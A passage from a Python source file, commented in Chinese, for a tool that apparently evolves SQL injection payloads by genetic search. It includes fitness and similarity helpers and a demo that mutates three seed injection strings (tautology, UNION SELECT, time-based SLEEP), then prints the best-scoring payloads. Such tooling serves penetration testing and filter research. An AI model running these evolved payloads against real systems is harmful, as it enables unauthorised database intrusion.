        if isinstance(ind, dict):
            return ind.get("payload", ind.get("content", ""))
        return str(ind)

    @staticmethod
    def _get_fitness(ind: Any) -> float:
        if hasattr(ind, "fitness"):
            return ind.fitness
        if isinstance(ind, dict):
            return ind.get("fitness", ind.get("score", 0.0))
        return 0.0

    @staticmethod
    def _get_strategies(ind: Any) -> List[str]:
        if hasattr(ind, "strategy_used"):
            return [ind.strategy_used] if ind.strategy_used else []
        if isinstance(ind, dict):
            st = ind.get("strategy_used", ind.get("strategies", []))
            return st if isinstance(st, list) else [st] if st else []
        return []

    @staticmethod
    def _payload_similarity(a: str, b: str) -> float:
        """计算两个 Payload 的字符级相似度"""
        if not a or not b:
            return 0.0
        # 使用 Jaccard 相似度（字符 n-gram 集合）
        def _ngrams(s: str, n: int = 3) -> set:
            return {s[i:i + n] for i in range(len(s) - n + 1)} if len(s) >= n else {s}

        set_a = _ngrams(a)
        set_b = _ngrams(b)
        if not set_a or not set_b:
            return 0.0
        intersection = set_a & set_b
        union = set_a | set_b
        return len(intersection) / len(union) if union else 0.0


if __name__ == "__main__":
    # 控制台编码安全（Windows GBK 终端可正常输出 UTF-8/零宽字符）
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

    # 离线演示：无需 LLM / 真实响应即可运行
    demo_seeds = [
        "1' OR '1'='1' -- ",
        "1 UNION SELECT 1,version() -- ",
        "1' AND SLEEP(5) -- ",
    ]

    # 接入元基因库 → 演示「自进化闭环」：第 1 次跑写回 L4，第 2 次跑读回先验
    try:
        from meta_gene import MetaGeneLibrary
        mgl = MetaGeneLibrary().load()
        print("=== 接入元基因库（L4 认知策略基因反馈桥）===")
    except Exception:
        mgl = None
        print("=== 未接入元基因库（开环演示）===")

    print("\n--- 第 1 次进化（冷启动，公平探索）---")
    eh1 = EvolutionEnhancer(population_size=24, meta_gene=mgl, vuln_type="sqli")
    eh1.evolve(demo_seeds, "sqli", generations=6)
    print(f"第1次 best_fitness={eh1.best.fitness}, 已写回 L4 基因")

    print("\n--- 第 2 次进化（读回 L4 先验，偏置策略选择）---")
    eh2 = EvolutionEnhancer(population_size=24, meta_gene=mgl, vuln_type="sqli")
    eh2.evolve(demo_seeds, "sqli", generations=6)
    print(f"第2次 best_fitness={eh2.best.fitness}, L4 先验权重={eh2._strategy_weights}")

    if mgl is not None:
        print("\n=== L4 认知策略基因统计 ===")
        print(json.dumps(mgl.get_stats(), ensure_ascii=False, indent=2))

    print("\n=== Top 3 最优 Payload ===")
    for i, ind in enumerate(eh2.top(3), 1):
        print(f"{i}. [{ind.fitness}] {ind.payload}  (lineage={ind.lineage})")
